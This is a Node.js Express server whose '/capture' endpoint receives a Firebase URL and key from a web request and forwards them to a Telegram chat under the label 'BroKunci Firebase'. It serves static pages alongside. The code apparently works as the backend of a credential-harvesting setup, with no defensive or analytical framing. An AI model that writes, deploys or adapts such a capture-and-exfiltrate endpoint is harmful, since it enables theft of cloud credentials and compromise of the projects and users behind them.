const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 10000;

// Serve static files (index.html etc.) from root
app.use(express.static(path.join(__dirname)));
app.use(express.json());

// CAPTURE ENDPOINT
app.post('/capture', async (req, res) => {
    const { url, key } = req.body;
    const botToken = process.env.TG_BOT_TOKEN;
    const chatId = process.env.TG_CHAT_ID;

    if (!botToken || !chatId) {
        return res.status(500).json({ error: 'Missing bot token or chat ID' });
    }

    const message = `<b>🔥 BroKunci Firebase</b>\n<pre>URL: ${url}\nKey: ${key}</pre>`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
        });
        const data = await response.json();
        if (!response.ok) throw new Error(data.description || 'Unknown error');
        res.json({ ok: true });
    } catch (e) {
        console.error('Telegram send error:', e);
        res.status(500).json({ error: e.message });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
